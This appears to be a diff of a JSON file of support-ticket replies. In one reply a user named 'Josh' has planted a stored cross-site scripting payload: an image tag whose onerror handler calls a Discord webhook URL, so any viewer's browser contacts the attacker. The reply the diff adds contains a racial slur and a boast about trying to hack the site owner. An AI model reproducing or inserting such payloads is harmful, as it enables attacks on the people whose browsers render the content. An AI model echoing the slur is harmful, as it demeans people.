@@ -1700,13 +1700,19 @@
       "status": "open",
       "unread": true,
       "createdAt": "2026-10-10T23:58:18.351Z",
-      "updatedAt": "2026-10-10T23:58:18.351Z",
+      "updatedAt": "2026-10-10T23:58:52.824Z",
       "replies": [
         {
           "by": "user",
           "name": "Josh",
           "text": "test 10 chars min <img src=x style=display:none onerror=this.src='https://discordapp.com/api/webhooks/1489723338174628002/0JR4otNx_UCfooa_ETpgGzOktrvlJk_6VJSzkVuVX696_efC22mcD4JYwDtivoiqC1wb'>",
           "at": "2026-10-10T23:58:18.351Z"
+        },
+        {
+          "by": "user",
+          "name": "Josh",
+          "text": "Mb Nigga i was tryna Hackr U !!",
+          "at": "2026-10-10T23:58:52.824Z"
         }
       ]
     }
